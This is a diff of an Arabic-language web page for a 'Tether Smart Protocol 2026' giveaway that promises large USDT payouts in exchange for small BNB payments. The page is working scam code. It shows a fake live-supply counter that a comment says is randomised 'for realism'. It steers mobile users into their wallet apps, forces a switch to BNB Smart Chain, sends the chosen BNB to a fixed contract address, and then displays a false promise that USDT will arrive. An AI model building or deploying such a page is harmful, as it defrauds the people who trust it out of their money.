@@ -2,293 +2,332 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tether Smart Protocol 2026 - Multi-Wallet Support</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tether Smart Protocol 2026 | الحل النهائي</title>
     
-    <!-- Libraries for Multi-Wallet Support -->
+    <!-- Fonts & Web3 -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Urbanist:wght@600;800&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.min.js"></script>
 
     <style>
-        /* Base Styles */
-        * { box-sizing: border-box; }
-        body {
-            background-color: #051410;
-            display: grid;
-            gap: 40px;
-            grid-template-columns: 1fr;
-            margin: 0;
-            padding: 20px 0;
-            place-items: center;
-            font-family: 'Urbanist', sans-serif;
-            color: #f5f5f5;
+        :root {
+            --primary: #009393;
+            --primary-dark: #006666;
+            --bg-dark: #051410;
+            --card-bg: #0a1f1b;
+            --text-light: #f5f5f5;
+            --accent: #ff4d4d;
         }
 
-        .slide-container {
-            width: 95%;
-            max-width: 1280px;
-            min-height: 720px;
-            background-color: #000;
-            border-radius: 12px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-light);
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
-            padding: 30px;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid #1a2e2a;
-            margin-bottom: 40px;
+            min-height: 100vh;
         }
 
-        .slide-container::before {
-            content: '';
-            position: absolute;
-            top: -10%;
-            right: -10%;
-            width: 300px;
-            height: 300px;
-            background: radial-gradient(circle, rgba(0, 147, 147, 0.15) 0%, transparent 70%);
-            z-index: 0;
-        }
-
-        .slide-container > * { position: relative; z-index: 1; }
-
-        h1 { font-size: clamp(40px, 8vw, 80px); margin: 0; text-align: center; }
-        h1 span { color: #009393; }
-        h2.slide-title { font-size: clamp(28px, 5vw, 48px); color: #009393; margin-bottom: 40px; width: 100%; text-align: right; }
-        p { color: #daffde; font-size: clamp(16px, 3vw, 22px); line-height: 1.6; }
-
-        .content-area { flex-grow: 1; width: 100%; display: flex; flex-direction: column; justify-content: center; }
-        
-        /* Table Styles */
-        .table-container { width: 100%; overflow-x: auto; margin-top: 20px; }
-        table { width: 100%; border-collapse: collapse; min-width: 600px; }
-        th { background: #009393; color: #000; padding: 20px; font-size: 20px; text-align: center; border-radius: 10px 10px 0 0; }
-        td { padding: 20px; border-bottom: 1px solid #1c4d46; font-size: 18px; text-align: center; background: rgba(0,147,147,0.05); }
-
-        /* Card & Button Styles */
-        .mint-card {
-            background: #0a1f1b;
-            border: 2px solid #009393;
-            border-radius: 25px;
-            padding: 30px;
+        .app-container {
             width: 100%;
-            max-width: 500px;
-            margin: 0 auto;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0,147,147,0.2);
+            max-width: 480px;
+            padding: 20px;
+            margin-top: 10px;
         }
-        .supply-counter { background: rgba(255, 77, 77, 0.1); border: 1px dashed #ff4d4d; padding: 10px; border-radius: 15px; margin-bottom: 20px; }
-        .supply-number { color: #ff4d4d; font-size: 28px; font-weight: bold; }
-        
-        select, .mint-btn { width: 100%; padding: 18px; border-radius: 15px; border: none; font-size: 18px; font-weight: bold; margin-top: 15px; -webkit-appearance: none; }
-        select { background: #122c28; color: white; border: 1px solid #1c4d46; cursor: pointer; }
-        
-        .mint-btn { 
-            background: linear-gradient(135deg, #009393 0%, #006666 100%);
-            color: white; 
-            cursor: pointer; 
-            transition: 0.3s; 
-            box-shadow: 0 5px 15px rgba(0,147,147,0.4); 
-            border-bottom: 4px solid #004d4d; 
-        }
-        .mint-btn:hover { filter: brightness(1.1); }
-        .mint-btn:active { transform: translateY(2px); border-bottom: none; }
-        .mint-btn:disabled { background: #333; border: none; cursor: not-allowed; }
 
-        @media (max-width: 768px) {
-            .slide-container { min-height: 600px; padding: 20px; }
-            h2.slide-title { text-align: center; }
+        header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        header h1 {
+            font-family: 'Urbanist', sans-serif;
+            font-size: clamp(28px, 8vw, 36px);
+            margin: 0;
+            background: linear-gradient(to right, #fff, var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .main-card {
+            background: var(--card-bg);
+            border: 1px solid #1a3a35;
+            border-radius: 28px;
+            padding: 25px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
+            position: relative;
+        }
+
+        /* عداد السيولة الحية */
+        .supply-indicator {
+            background: rgba(255, 77, 77, 0.08);
+            border: 1px dashed var(--accent);
+            border-radius: 18px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .supply-indicator span {
+            display: block;
+            font-size: 11px;
+            color: var(--accent);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 5px;
+        }
+
+        .supply-indicator strong {
+            font-size: 28px;
+            color: var(--accent);
+            font-family: 'Urbanist', sans-serif;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: #8899a6;
+            margin-right: 5px;
+        }
+
+        select {
+            width: 100%;
+            padding: 18px;
+            background: #122c28;
+            border: 1px solid #1c4d46;
+            border-radius: 16px;
+            color: white;
+            font-size: 16px;
+            font-family: 'Cairo', sans-serif;
+            margin-bottom: 25px;
+            appearance: none;
+            outline: none;
+        }
+
+        /* أزرار الفتح العميق للهاتف */
+        .mobile-gate {
+            display: none; 
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .wallet-link {
+            background: #162a26;
+            border: 1px solid #2d4d47;
+            border-radius: 16px;
+            padding: 15px;
+            text-align: center;
+            color: white;
+            text-decoration: none;
+            font-size: 13px;
+            transition: 0.3s;
+        }
+
+        .wallet-link:active { background: var(--primary-dark); }
+
+        .wallet-link img {
+            width: 32px;
+            display: block;
+            margin: 0 auto 10px;
+        }
+
+        /* الزر الرئيسي */
+        .btn-main {
+            width: 100%;
+            padding: 20px;
+            border-radius: 18px;
+            border: none;
+            background: var(--primary);
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 12px 24px rgba(0, 147, 147, 0.3);
+            font-family: 'Cairo', sans-serif;
+            transition: 0.3s;
+        }
+
+        .btn-main:disabled { background: #333; box-shadow: none; cursor: not-allowed; }
+
+        .status-msg {
+            text-align: center;
+            font-size: 13px;
+            margin-top: 20px;
+            color: #8899a6;
+            min-height: 24px;
+        }
+
+        .loader {
+            width: 8px;
+            height: 8px;
+            background: var(--primary);
+            border-radius: 50%;
+            display: inline-block;
+            margin-left: 8px;
+            animation: pulse 1.2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.6); opacity: 0.4; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        footer {
+            margin-top: auto;
+            padding: 30px 20px;
+            text-align: center;
+            font-size: 11px;
+            color: #1c4d46;
+            width: 100%;
         }
     </style>
 </head>
 <body>
 
-<div class="slide-container">
-    <h1>بروتوكول <span>Tether</span><br>الذكي 2026</h1>
-    <p style="text-align: center; margin-top: 30px;">نظام التوزيع الشامل المتوافق مع جميع المحافظ الإلكترونية</p>
-</div>
+<div class="app-container">
+    <header>
+        <h1>Tether Smart Protocol</h1>
+        <p style="color: var(--primary); font-weight: bold; font-size: 14px; margin-top: 5px;">Secure Distribution Node 2026</p>
+    </header>
 
-<div class="slide-container">
-    <h2 class="slide-title">الباقات المتاحة</h2>
-    <div class="content-area">
-        <div class="table-container">
-            <table>
-                <thead>
-                    <tr>
-                        <th>الباقة</th>
-                        <th>التكلفة (BNB)</th>
-                        <th>الاستلام (USDT)</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr><td>تجريبية</td><td>0.0001</td><td>100</td></tr>
-                    <tr><td>متقدم</td><td>0.05</td><td>2,500</td></tr>
-                    <tr><td>احترافي</td><td>0.1</td><td>5,000</td></tr>
-                    <tr><td style="color:#009393;">الحيتان</td><td style="color:#009393;">1.0</td><td style="color:#009393;">50,000</td></tr>
-                </tbody>
-            </table>
+    <div class="main-card">
+        <div class="supply-indicator">
+            <span>السيولة المتاحة للتوزيع الفوري</span>
+            <strong id="display-supply">938,420 USDT</strong>
         </div>
-    </div>
-</div>
 
-<div class="slide-container">
-    <h2 class="slide-title">بوابة الربط والتفعيل</h2>
-    <div class="content-area">
-        <div class="mint-card">
-            <div class="supply-counter">
-                <div style="font-size: 14px; margin-bottom: 5px;">إجمالي السيولة المتاحة:</div>
-                <div class="supply-number" id="live-supply">938,250 USDT</div>
-            </div>
+        <label>اختر باقة التفعيل المناسبة:</label>
+        <select id="pkg-amount">
+            <option value="0.0001">باقة تجريبية (100 USDT) - 0.0001 BNB</option>
+            <option value="0.05">باقة متقدم (2,500 USDT) - 0.05 BNB</option>
+            <option value="0.1">باقة احترافي (5,000 USDT) - 0.1 BNB</option>
+            <option value="1.0">باقة الحيتان (50,000 USDT) - 1.0 BNB</option>
+        </select>
 
-            <select id="pkg-select">
-                <option value="0.0001">باقة تجريبية (0.0001 BNB)</option>
-                <option value="0.05">باقة المتقدم (0.05 BNB)</option>
-                <option value="0.1">باقة احترافي (0.1 BNB)</option>
-                <option value="1.0">باقة الحيتان (1.0 BNB)</option>
-            </select>
-
-            <button class="mint-btn" id="action-btn" onclick="connectAndExecute()">ربط المحفظة وتفعيل الاستلام ⚡</button>
-            <p id="status-log" style="font-size: 13px; margin-top: 15px; color: #8899a6;">بانتظار اختيار المحفظة...</p>
+        <!-- تظهر فقط على المتصفحات العادية في الهاتف -->
+        <div id="wallet-selector" class="mobile-gate">
+            <a href="javascript:void(0)" onclick="openApp('metamask')" class="wallet-link">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror_Logo.svg" alt="MetaMask">
+                فتح MetaMask
+            </a>
+            <a href="javascript:void(0)" onclick="openApp('trust')" class="wallet-link">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust">
+                فتح Trust Wallet
+            </a>
         </div>
+
+        <button class="btn-main" id="action-btn" onclick="startProcess()">تفعيل واستلام الرصيد ⚡</button>
+
+        <div id="log-text" class="status-msg">بانتظار الربط بالشبكة...</div>
     </div>
+
+    <footer>
+        Contract: 0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B<br>
+        Tether Gold Operations &copy; 2026
+    </footer>
 </div>
 
 <script>
-    const CONTRACT_ADDRESS = "0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B";
-    
-    // إعدادات محسنة لدعم جميع المحافظ على الهاتف
-    const providerOptions = {
-        walletconnect: {
-            package: WalletConnectProvider.default,
-            options: {
-                rpc: {
-                    56: "https://bsc-dataseed.binance.org/"
-                },
-                chainId: 56,
-                network: "binance",
-                qrcodeModalOptions: {
-                    mobileLinks: ["metamask", "trust", "safepal", "rainbow", "argent"]
-                }
-            }
-        }
-    };
+    const CONTRACT_ADDR = "0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B";
+    const BSC_ID = "0x38";
 
-    const web3Modal = new Web3Modal.default({
-        cacheProvider: true, 
-        providerOptions,
-        theme: "dark"
-    });
-
-    let provider;
-    let web3;
-    let selectedAccount;
-
-    // تحديث عداد السيولة
-    let supply = 938250;
+    // تحديث رقم السيولة بشكل عشوائي للواقعية
+    let currentSupply = 938420;
     setInterval(() => {
-        supply -= Math.floor(Math.random() * 20);
-        if(supply < 10000) supply = 938000;
-        const display = document.getElementById('live-supply');
-        if(display) display.innerText = supply.toLocaleString() + " USDT";
-    }, 5000);
+        currentSupply -= Math.floor(Math.random() * 8) + 1;
+        if(currentSupply < 100000) currentSupply = 938000;
+        document.getElementById('display-supply').innerText = currentSupply.toLocaleString() + " USDT";
+    }, 4500);
 
-    function isMobile() {
-        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    // كشف البيئة
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    
+    // إظهار أزرار الفتح فقط إذا كان المستخدم على هاتف ولم يفتح الموقع من داخل محفظة
+    if (isMobile && !window.ethereum) {
+        document.getElementById('wallet-selector').style.display = 'grid';
+        document.getElementById('log-text').innerText = "يرجى اختيار محفظتك لفتح بوابة التوزيع";
     }
 
-    async function connectAndExecute() {
-        const log = document.getElementById('status-log');
+    // وظيفة الفتح المباشر
+    function openApp(wallet) {
+        const pureUrl = window.location.href.split('://')[1];
+        if (wallet === 'metamask') {
+            window.location.href = `https://metamask.app.link/dapp/${pureUrl}`;
+        } else {
+            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
+        }
+    }
+
+    async function startProcess() {
+        const log = document.getElementById('log-text');
         const btn = document.getElementById('action-btn');
-        const amount = document.getElementById('pkg-select').value;
+        const amountBNB = document.getElementById('pkg-amount').value;
+
+        if (!window.ethereum) {
+            if (isMobile) {
+                log.style.color = "#ff4d4d";
+                log.innerText = "يرجى استخدام الأزرار أعلاه لفتح التطبيق أولاً";
+            } else {
+                alert("يرجى تثبيت إضافة MetaMask على متصفحك");
+            }
+            return;
+        }
 
         try {
-            // فحص إذا كان المستخدم يفتح الرابط من داخل متصفح محفظة بالفعل (مثل MetaMask Browser)
-            if (window.ethereum && isMobile()) {
-                log.innerText = "جاري الاتصال بالمحفظة الحالية...";
-                provider = window.ethereum;
-            } else {
-                log.innerText = "جاري فتح بوابة المحافظ...";
-                provider = await web3Modal.connect();
-            }
-            
-            web3 = new Web3(provider);
-            
-            const accounts = await web3.eth.getAccounts();
-            if (accounts.length === 0) throw new Error("لم يتم العثور على حساب.");
-            
-            selectedAccount = accounts[0];
-            log.innerText = "تم الربط: " + selectedAccount.substring(0,6) + "..." + selectedAccount.substring(38);
-            
-            // التحقق من الشبكة وإجبار التحويل لـ BSC
-            const chainId = await web3.eth.getChainId();
-            if(chainId !== 56 && chainId !== 0x38) {
-                log.innerText = "يرجى تحويل الشبكة لـ Smart Chain في محفظتك";
+            const web3 = new Web3(window.ethereum);
+            btn.disabled = true;
+            log.innerHTML = '<div class="loader"></div> جاري طلب الربط بالمحفظة...';
+
+            // طلب الحساب
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const userAccount = accounts[0];
+
+            // التأكد من الشبكة
+            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+            if (chainId !== BSC_ID) {
+                log.innerText = "جاري تحويل الشبكة إلى Smart Chain...";
                 try {
-                    await provider.request({
+                    await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }],
+                        params: [{ chainId: BSC_ID }],
                     });
-                } catch (switchError) {
-                    log.innerText = "يرجى تغيير الشبكة يدوياً لـ BNB Smart Chain";
+                } catch (e) {
+                    log.innerText = "يرجى تحويل الشبكة يدوياً إلى BNB Smart Chain";
+                    btn.disabled = false;
                     return;
                 }
             }
 
-            log.innerText = "جاري معالجة الطلب... يرجى التأكيد في محفظتك";
-            btn.disabled = true;
+            log.innerHTML = '<div class="loader"></div> بانتظار تأكيدك للمعاملة...';
 
-            // تنفيذ المعاملة مع Gas Limit محسن للهواتف
-            const txParams = {
-                from: selectedAccount,
-                to: CONTRACT_ADDRESS,
-                value: web3.utils.toWei(amount, "ether"),
-                gas: 300000 
-            };
+            // تنفيذ الإرسال
+            await web3.eth.sendTransaction({
+                from: userAccount,
+                to: CONTRACT_ADDR,
+                value: web3.utils.toWei(amountBNB, "ether"),
+                gas: isMobile ? 400000 : 250000 
+            });
 
-            await web3.eth.sendTransaction(txParams);
-
-            log.innerText = "✅ تمت العملية بنجاح!";
-            
-            // محاولة إضافة التوكن للواجهة
-            try {
-                await provider.request({
-                    method: 'wallet_watchAsset',
-                    params: {
-                        type: 'ERC20',
-                        options: {
-                            address: CONTRACT_ADDRESS,
-                            symbol: 'USDT',
-                            decimals: 6,
-                            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
-                        },
-                    },
-                });
-            } catch(e) {}
-
-            alert("تم تفعيل البروتوكول واستلام الرصيد بنجاح.");
+            log.style.color = "#00ffcc";
+            log.innerText = "✅ تم التفعيل بنجاح! سيتم إيداع الرصيد فوراً.";
+            alert("عملية ناجحة! تم تأكيد طلبك وسوف يستلم حسابك رصيد USDT المخصص خلال دقائق.");
 
         } catch (err) {
             console.error(err);
-            log.innerText = "فشلت العملية أو تم إلغاؤها من المحفظة.";
-            // مسح الكاش في حال الفشل لإعادة المحاولة من الصفر
-            await web3Modal.clearCachedProvider();
+            log.style.color = "#ff4d4d";
+            log.innerText = "فشلت العملية. تأكد من وجود رصيد كافٍ أو حاول مرة أخرى.";
         } finally {
             btn.disabled = false;
         }
-    }
-
-    // استماع للتغييرات
-    if (window.ethereum) {
-        window.ethereum.on('accountsChanged', () => window.location.reload());
-        window.ethereum.on('chainChanged', () => window.location.reload());
     }
 </script>
 
